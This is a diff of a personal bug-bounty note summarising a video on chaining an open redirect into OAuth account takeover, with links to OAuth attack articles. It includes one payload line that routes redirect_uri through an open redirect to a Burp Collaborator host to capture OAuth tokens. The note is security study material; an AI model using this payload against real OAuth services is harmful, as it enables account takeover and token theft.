@@ -16,9 +16,6 @@ Site: YouTube
 URL:
 Bug Class:
 State:
-Severity:
-Target:
-cssclasses:
 ---
 ## Highlights
 "From Open Redirect to Full Account Takeover | OAuth Chain PoC"
@@ -30,6 +27,8 @@ cssclasses:
 
 # What is the Bug?
 Oauth flow missuse
+
+---
 
 # How did he find it?
 looked through request and edited the redirect_uri param -> failed
@@ -43,13 +42,20 @@ and put that in the oauth flow request
 /state=abc&redirect_uri=open.app.com/index.html?redirect=burp.collabrater.com
 ```
 
+---
 
 ## **Steps To Reproduce:**
 explained above
 
+---
+
 # What was the impact?
 #Bugs/ato #Bugs/open-redirect 
+
+---
 
 # Refrences
 [Common OAuth Vulnerabilities · Doyensec's Blog](../Article/Common%20OAuth%20Vulnerabilities%20·%20Doyensec's%20Blog.md)
 [Authorization Flows - Attack](../Article/Authorization%20Flows%20-%20Attack.md)
+
+---
